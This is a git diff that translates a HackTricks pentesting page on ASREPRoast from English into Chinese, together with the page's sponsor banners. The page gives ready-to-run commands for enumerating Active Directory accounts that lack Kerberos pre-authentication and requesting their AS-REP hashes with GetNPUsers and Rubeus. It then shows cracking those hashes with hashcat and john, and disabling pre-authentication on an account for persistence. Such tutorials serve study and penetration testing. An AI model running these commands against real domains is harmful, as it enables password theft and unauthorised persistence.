@@ -2,59 +2,55 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
 
 <figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-**HackenProof is home to all crypto bug bounties.**
+**HackenProof是所有加密漏洞赏金的家园。**
 
-**Get rewarded without delays**\
-HackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.
+**无需等待即可获得奖励**\
+HackenProof的赏金只有在客户存入奖励预算后才会启动。在漏洞经过验证后，您将获得奖励。
 
-**Get experience in web3 pentesting**\
-Blockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.
+**在web3渗透测试中获得经验**\
+区块链协议和智能合约是新的互联网！在其兴起的日子里掌握web3安全。
 
-**Become the web3 hacker legend**\
-Gain reputation points with each verified bug and conquer the top of the weekly leaderboard.
+**成为web3黑客传奇**\
+每次验证的漏洞都会获得声誉积分，并占据每周排行榜的榜首。
 
-[**Sign up on HackenProof**](https://hackenproof.com/register) start earning from your hacks!
+[**在HackenProof上注册**](https://hackenproof.com/register)开始从您的黑客攻击中获利！
 
 {% embed url="https://hackenproof.com/register" %}
 
 ## ASREPRoast
 
-The ASREPRoast attack looks for **users without Kerberos pre-authentication required attribute (**[_**DONT\_REQ\_PREAUTH**_](https://support.microsoft.com/en-us/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro)_**)**_.
+ASREPRoast攻击寻找**不需要Kerberos预身份验证属性（[_**DONT\_REQ\_PREAUTH**_](https://support.microsoft.com/en-us/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro)_**）**的用户。
 
-That means that anyone can send an AS\_REQ request to the DC on behalf of any of those users, and receive an AS\_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.
+这意味着任何人都可以代表这些用户向DC发送AS\_REQ请求，并接收AS\_REP消息。这种消息包含使用原始用户密钥（从其密码派生）加密的一段数据。然后，通过使用此消息，可以离线破解用户密码。
 
-Furthermore, **no domain account is needed to perform this attack**, only connection to the DC. However, **with a domain account**, a LDAP query can be used to **retrieve users without Kerberos pre-authentication** in the domain. **Otherwise usernames have to be guessed**.
+此外，**执行此攻击不需要域帐户**，只需要连接到DC。然而，**使用域帐户**可以使用LDAP查询来**检索域中不需要Kerberos预身份验证的用户**。**否则必须猜测用户名**。
 
-#### Enumerating vulnerable users (need domain credentials)
-
+#### 枚举易受攻击的用户（需要域凭据）
 ```bash
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
+#### 请求AS_REP消息
 
-#### Request AS\_REP message
-
-{% code title="Using Linux" %}
+{% code title="使用Linux" %}
 ```bash
 #Try all the usernames in usernames.txt
 python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
 #Use domain creds to extract targets and target them
 python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
 ```
-{% endcode %}
-
-{% code title="Using Windows" %}
+{% code title="使用Windows" %}
 ```bash
 .\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
@@ -62,42 +58,38 @@ Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github
 {% endcode %}
 
 {% hint style="warning" %}
-AS-REP Roasting with Rubeus will generate a 4768 with an encryption type of 0x17 and preauth type of 0.
+使用Rubeus进行AS-REP Roasting将生成一个加密类型为0x17和预身份验证类型为0的4768。
 {% endhint %}
 
-### Cracking
-
+### 破解
 ```
 john --wordlist=passwords_kerb.txt hashes.asreproast
-hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
+hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
+### 持久性
 
-### Persistence
-
-Force **preauth** not required for a user where you have **GenericAll** permissions (or permissions to write properties):
-
+对于具有**GenericAll**权限（或具有写入属性的权限）的用户，强制**preauth**不是必需的：
 ```bash
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
+## 参考资料
 
-## References
-
-[**More information about AS-RRP Roasting in ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
+[**有关使用 Rubeus 和 Hashcat 进行 AS-REP Roasting 的更多信息，请参考 ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
 
 <figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-**HackenProof is home to all crypto bug bounties.**
+**HackenProof 是所有加密漏洞赏金的家园。**
 
-**Get rewarded without delays**\
-HackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.
+**即刻获得奖励**\
+HackenProof 的赏金只有在客户存入奖励预算后才会启动。在漏洞验证后，您将获得奖励。
 
-**Get experience in web3 pentesting**\
-Blockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.
+**在 web3 渗透测试中积累经验**\
+区块链协议和智能合约是新的互联网！在其兴起之时掌握 web3 安全。
 
-**Become the web3 hacker legend**\
-Gain reputation points with each verified bug and conquer the top of the weekly leaderboard.
+**成为 web3 黑客传奇**\
+每次验证的漏洞都会增加声誉点数，征服每周排行榜的顶端。
 
-[**Sign up on HackenProof**](https://hackenproof.com/register) start earning from your hacks!
+[**在 HackenProof 上注册**](https://hackenproof.com/register) 并从您的黑客攻击中获利！
 
 {% embed url="https://hackenproof.com/register" %}
 
@@ -105,10 +97,10 @@ Gain reputation points with each verified bug and conquer the top of the weekly 
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* 您在一家**网络安全公司**工作吗？您想在 HackTricks 中看到您的**公司广告**吗？或者您想获得**PEASS 的最新版本或下载 PDF 格式的 HackTricks**？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获得[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或在 **Twitter** 上**关注**我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享您的黑客技巧。**
 
 </details>
